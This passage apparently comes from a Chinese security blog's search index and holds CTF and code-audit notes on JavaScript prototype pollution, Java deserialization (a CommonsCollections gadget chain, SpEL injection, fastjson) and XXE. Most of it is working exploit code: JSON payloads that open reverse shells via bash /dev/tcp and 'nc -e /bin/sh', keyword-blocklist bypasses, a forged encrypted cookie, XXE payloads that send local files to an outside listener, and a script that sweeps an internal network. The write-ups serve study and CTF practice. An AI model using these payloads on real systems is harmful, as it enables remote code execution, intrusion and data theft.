if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)}   req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  });</code></pre><p>那么就可以污染属性了。污染哪个呢？</p><pre><code class="js">router.get(&#39;/&#39;, function (req, res) {  if(!req.session.user){    res.redirect(&#39;/login&#39;);  }  res.outputFunctionName=undefined;  res.render(&#39;index&#39;,data={&#39;user&#39;:req.session.user.user});});router.get(&#39;/info&#39;, function (req, res) {  res.render(&#39;index&#39;,data={&#39;user&#39;:res.outputFunctionName});})</code></pre><p>我们这里就直接污染 <code>res.outputFunctionName</code> </p><p>(测试的时候Windows下无法用nc弹shell)</p><p><img src="/posts/5d5d07b8/1583322699980.png" alt></p><p>然后访问 info 页面即可</p><p>原来的payload</p><pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}</code></pre><h3 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h3><p>这题也是JavaScript原型链污染，不过这里更明显</p><pre><code class="js">if (sekiro.attackInfo.additionalEffect) {    var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)    sekiro = fn(sekiro)}</code></pre><p><code>Function</code> 是动态构造函数</p><p>payload</p><pre><code class="json"> {&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc vps-ip port -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p><img src="/posts/5d5d07b8/1583323453485.png" alt></p><p>然后vps上即可监听到请求(当然我这里只是nc一下)</p><p>写到这里突然又想起来了 2019XNUCA的一道JavaScript原型链污染的题目</p><h3 id="2019-XNUCA-hardjs"><a href="#2019-XNUCA-hardjs" class="headerlink" title="2019 XNUCA hardjs"></a>2019 XNUCA hardjs</h3><p>(盗了一张图过来)</p><p>能够RCE的点出在 <code>res.render</code> 处，具体的就不分析了，这里是最后的变量拼接的地方</p><p><img src="/posts/5d5d07b8/j_3.png" alt></p><p>从这里可以看到有两个拼接的变量可以使用</p><p>于是就能够构造两个payload</p><pre><code class="json">{&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true}}}}</code></pre><p>或者</p><pre><code class="json"> {    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;return process.env.FLAG;//;var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>当然要是想弹shell也不是不可以</p><pre><code class="json">{    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>现在回顾起当时遇到这道题还啥都不会，现在又突然想起来的这种感觉好好玩</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></p><p><a href="http://passingfoam.com/2019/08/31/XNUCA-2019-web-复现/" target="_blank" rel="noopener">http://passingfoam.com/2019/08/31/XNUCA-2019-web-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java审计笔记</title>
      <link href="/posts/21b61fbe/"/>
      <url>/posts/21b61fbe/</url>
      
        <content type="html"><![CDATA[<h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>正常执行一条命令</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>如果通过反射来执行：</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</code></pre><p><code>Runtime</code> 的构造方法是私有的，遵循单例模式，所以无法直接调用，但是可以通过调用静态方法 <code>getRuntime</code> 来获得一个 <code>Runtime</code> 对象，这个方法是静态的，并不需要传递类的实例进去(不然就陷入了死循环)，而调用之后返回的结果是一个 <code>Runtime</code> 对象，作为 <code>exec</code> 方法的第一个参数，这是因为 <code>exec</code> 方法不是静态方法</p><p>我们正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> </p><p>当然如果分解开来比较好理解一点:</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)//runtime.exec(&quot;calc&quot;) 即可Method method2 = clazz.getMethod(&quot;exec&quot;, String.class); //得到exec方法method2.invoke(runtime, &quot;calc&quot;); //调用exec方法</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="Apache-CommonsCollections反序列化"><a href="#Apache-CommonsCollections反序列化" class="headerlink" title="Apache CommonsCollections反序列化"></a>Apache CommonsCollections反序列化</h2><p>只要弄懂了反射的逻辑，那么理解 <code>CommonsCollections</code> 的payload也就不难了,重点在构造 <code>transformers</code> 数组的时候</p><pre><code class="java">Transformer[] transformers = new Transformer[]{        new ConstantTransformer(Runtime.class),         new InvokerTransformer(&quot;getMethod&quot;, new Class[]{                String.class, Class[].class}, new Object[]{                &quot;getRuntime&quot;,null}),        new InvokerTransformer(&quot;invoke&quot;, new Class[]{                Object.class, Object[].class}, new Object[]{null,new Object[0]}),        new InvokerTransformer(&quot;exec&quot;, new Class[]{                String.class}, new Object[]{&quot;calc&quot;})};Transformer transformedChain = new ChainedTransformer(transformers);transformedChain.transform(transformers);  //触发</code></pre><p><code>transformers</code> 数组中的每一个对象都会调用一次 <code>transform</code> 函数，<code>ConstantTransformer</code> 直接返回了 <code>Runtime.class</code>  作为下一个 <code>transform</code> 的参数 等价于</p><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类</code></pre><p>之后 <code>InvokerTransformer</code> 的 <code>transform</code> 接收传过来的 <code>Runtime.class</code> 去调用其 <code>getMethod</code>方法，等价于</p><pre><code>Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法</code></pre><p>返回了一个 <code>Method</code>类型的作为下一次 <code>transform</code> 的参数，之后的过程就是分别调用 <code>invoke</code> 和 <code>exec</code> 方法，等价于</p><pre><code>Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)runtime.exec(&quot;calc&quot;)</code></pre><p>由于 <code>getRuntime</code> 方法是静态的， <code>invoke</code> 的时候第一个参数不必是类的实例，之后由于已经获取到了 <code>Runtime</code> 的实例就不再需要通过反射去获得 <code>exec</code> 方法再 <code>invoke</code> 了，省去了一点麻烦的步骤</p><p>一开始在分析 <code>InvokerTransformer</code> 的 <code>transform</code> 方法时被绕晕了，还以为是反射的反射，但是如果从函数所起的作用来分析就很明确了</p><p><code>getMethod</code> 和 <code>invoke</code> 方法的原型，所以我们在反射的时候也需要指定这些参数的class</p><pre><code class="java">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)public Object invoke(Object obj, Object... args)</code></pre><p>但是实际上我们在调用 <code>getMethod</code> 的时候，只需要指定第一个参数为 <code>getRuntime</code> 即可，那么第二个参数我们可以设为 null 或者 <code>new Class[0]</code> ，同理， invoke 方法这里不需要指定参数可以将两个参数都设置为 null</p><p>理解一下 <code>collections.map.TransformedMap</code> 这个类，提供了一个 <code>decorateTransform</code> 方法，可以将普通的map转化为 <code>TransformedMap</code> ，这个函数的原型</p><pre><code class="java">public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) </code></pre><p>第二个和第三个参数都是 <code>Transformer</code> 类型的，也就是每次更新map的时候，比如对map执行 put操作的时候</p><pre><code class="java">public Object put(Object key, Object value) {    key = transformKey(key);    value = transformValue(value);    return getMap().put(key, value);}</code></pre><p>会针对 key 和 value 执行 transform 操作</p><p>结合之前的 payload, 我们可以编写这个代码弹出计算器</p><pre><code class="java">public class Test {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class}, new Object[] {                        &quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, null }),                new InvokerTransformer(&quot;exec&quot;, new Class[] {                        String.class }, new Object[] {&quot;calc.exe&quot;})};        Transformer transformedChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();         Map outMap = TransformedMap.decorate(innerMap, null, transformedChain); //转变为 TransformedMap 操作        outMap.put(&quot;key&quot;, &quot;value&quot;);//触发payload    }}</code></pre><p>但是网上给的payload都是针对 <code>setValue</code> 方法触发的payload，这是怎么找到的</p><p>经过调试我发现 <code>AbstractMapEntryDecorator</code> 实现了 <code>Map</code>，其中的  <code>setValue</code> 是这么写的</p><pre><code class="java">public Object setValue(Object object) {    return entry.setValue(object);}</code></pre><p>这个方法之后又被 <code>AbstractInputCheckedMapDecorator</code> 的内部 <code>MapEntry</code> 类重写</p><pre><code class="java">public Object setValue(Object value) {    value = parent.checkSetValue(value); //多了一次 checkSetValue 操作    return entry.setValue(value);}</code></pre><p>这个多出来的 <code>checkSetValue</code> 方法又是 <code>AbstractInputCheckedMapDecorator</code>  的，而 <code>TransformedMap</code> 正是重写了这个方法</p><p><img src="/posts/21b61fbe/1580461320232.png" alt></p><p>所以实际上是的结果是调用了 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法</p><pre><code class="java">protected Object checkSetValue(Object value) {    return valueTransformer.transform(value);}</code></pre><p>这样就能触发payload了</p><p>之后寻找能够触发 <code>setValue</code> 方法的类，这里利用了 <code>AnnotationInvocationHandler</code></p><p>不过这里似乎只有jdk7才能运行，我开始用的jdk8不能成功</p><p>最后的测试代码</p><pre><code class="java">package com.alibaba.dubbo.demo;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.File;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;import javax.management.ObjectInstance;import com.alibaba.dubbo.common.serialize.ObjectInput;/** * @description: 测试 * @author: Pxy * @create: 2020-01-31 16:21 **/public class Test {        public static void main(String[] args) throws Exception {            Transformer[] transformers = new Transformer[]{                    new ConstantTransformer(Runtime.class),                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                            String.class, Class[].class}, new Object[] {                            &quot;getRuntime&quot;, new Class[0]}),                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {                            Object.class, Object[].class }, new Object[] {                            null, new Object[0]}),                    new InvokerTransformer(&quot;exec&quot;, new Class[] {                            String.class }, new Object[] {&quot;calc.exe&quot;})};            Transformer transformedChain = new ChainedTransformer(transformers);            Map innerMap = new HashMap();            innerMap.put(&quot;key&quot;, &quot;value&quot;);            Map outMap = TransformedMap.decorate(innerMap, null, transformedChain);            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            Object instance = ctor.newInstance(Retention.class, outMap);            File f = new File(&quot;payload.bin&quot;);            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));            out.writeObject(instance);            out.flush();            out.close();            ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;payload.bin&quot;));            input.readObject();            input.close();        }}</code></pre><p>先断在这个 <code>AnnotationInvocationHandler</code> 类中</p><p><img src="/posts/21b61fbe/1580469219896.png" alt></p><p>然后触发 <code>checkSetValue</code> 方法</p><p><img src="/posts/21b61fbe/1580469249634.png" alt="1580469249634"></p><p>最后成功弹出计算器</p><h2 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h2><p>类似于 jinja 表达式，不过更为强大</p><p>编写一个接口进行测试：</p><pre><code class="java">@GetMapping(&quot;/spel&quot;)public String spel(String input) throws  Exception{    SpelExpressionParser parser = new SpelExpressionParser();    Expression expression = (Expression)parser.parseExpression(input);    return expression.getValue().toString();}</code></pre><p>访问 <code>/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</code></p><p><img src="/posts/21b61fbe/1580468482834.png" alt></p><h2 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h2><p>这道题并不算难，结合了java反射和spel表达式注入</p><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><pre><code class="yaml">keywords:  blacklist:     - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><pre><code class="java">ParserContext parserContext = new TemplateParserContext();Expression exp = parser.parseExpression(val, parserContext);SmallEvaluationContext evaluationContext = new SmallEvaluationContext();return exp.getValue(evaluationContext).toString();</code></pre><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><pre><code class="java">@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,                    HttpSession session,                    Model model) {    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {        String username = userConfig.decryptRememberMe(rememberMeValue);        if (username != null) {            session.setAttribute(&quot;username&quot;, username);        }    }    Object username = session.getAttribute(&quot;username&quot;);    if(username == null || username.toString().equals(&quot;&quot;)) {        return &quot;redirect:/login&quot;;    }    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));    return &quot;hello&quot;;}</code></pre><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); //注意java的字符串必须是双引号</code></pre><p>生成payload</p><pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p><p><img src="/posts/21b61fbe/1573973547431-1580346732870.png" alt="结果"></p><h2 id="fastjson-反序列化-仅复现"><a href="#fastjson-反序列化-仅复现" class="headerlink" title="fastjson 反序列化(仅复现)"></a>fastjson 反序列化(仅复现)</h2><p>docker开启环境之后，首先需要生成一个 <code>TouchFile</code> 恶意文件，然后编译成class文件</p><pre><code class="java">// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile {    static {        try {            Runtime rt = Runtime.getRuntime();            String[] commands = {&quot;touch&quot;, &quot;/tmp/success&quot;};            Process pc = rt.exec(commands);            pc.waitFor();        } catch (Exception e) {            // do nothing        }    }}</code></pre><p>用python开一个服务器，监听8001端口</p><p>再开启一个rmi服务器，靶机ip为192.168.99.100，本机相对靶机是192.168.99.1</p><p><img src="/posts/21b61fbe/1580469670376.png" alt></p><p>这时候将payload发送过去，payload只是演示了在 tmp 目录下创建文件</p><p><img src="/posts/21b61fbe/1580469645918.png" alt></p><p>创建成功</p><p><img src="/posts/21b61fbe/1580469708254.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/#h4.1_%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Java反序列化漏洞通用利用分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE复习</title>
      <link href="/posts/2e545689/"/>
      <url>/posts/2e545689/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents(&quot;php://input&quot;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);var_dump($creds);</code></pre><p>使用XML发送数据：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY a SYSTEM &quot;http://localhost:8887/aaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;a;&lt;/root&gt;</code></pre><p>但是我在尝试参数实体的时候似乎不能外带数据</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % a &quot;http://localhost:8887/aaa&quot;&gt;%a;]&gt;&lt;root&gt;&lt;/root&gt;</code></pre><p><img src="/posts/2e545689/1580302730124.png" alt></p><p>嵌套也是不行的</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src="/posts/2e545689/1580302833010-1580342074917.png" alt></p><p><code>local.xml</code> 文件内容：</p><pre><code class="xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;%start;</code></pre><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;      &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.txt&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</code></pre><p>然后就可以在8887端口接收到数据了</p><p><img src="/posts/2e545689/1580302962486-1580342120888.png" alt></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://localhost:8887/p=%file;&#39;&gt;&quot;&gt;</code></pre><p>发送的 paylod</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;%remote;%int;%send;]&gt;</code></pre><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p><img src="/posts/2e545689/1580303152983-1580342131433.png" alt></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><pre><code class="xml">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}    x = requests.post(&#39;http://127.0.0.1/xml.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;192.168.1.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:      print &quot;error&quot;continue</code></pre><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
